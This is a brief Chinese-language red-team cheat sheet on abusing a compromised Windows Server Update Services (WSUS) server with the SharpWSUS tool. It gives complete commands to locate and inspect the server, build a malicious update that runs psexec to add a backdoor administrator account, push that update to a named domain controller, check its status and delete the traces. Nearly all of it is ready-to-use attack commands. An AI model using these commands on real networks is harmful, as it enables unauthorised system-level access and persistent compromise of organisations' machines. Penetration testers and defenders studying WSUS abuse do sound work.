# 部署 - WSUS

> Windows Server Update Services（WSUS）使信息技术管理员能够部署最新的 Microsoft 产品更新。你可以使用 WSUS 全面管理通过 Microsoft Update 发布到网络计算机的更新分发

:warning: 载荷必须是微软签名的二进制文件，并且必须指向磁盘上的位置以供 WSUS 服务器加载该二进制文件。

* [SharpWSUS](https://github.com/nettitude/SharpWSUS)

1. 使用 `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate` 或 `SharpWSUS.exe locate` 定位
2. WSUS 服务器入侵后：`SharpWSUS.exe inspect`
3. 创建恶意补丁：`SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add ^& net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"`
4. 部署到目标：`SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:"Demo Group"`
5. 检查部署状态：`SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local`
6. 清理：`SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:"Demo Group`
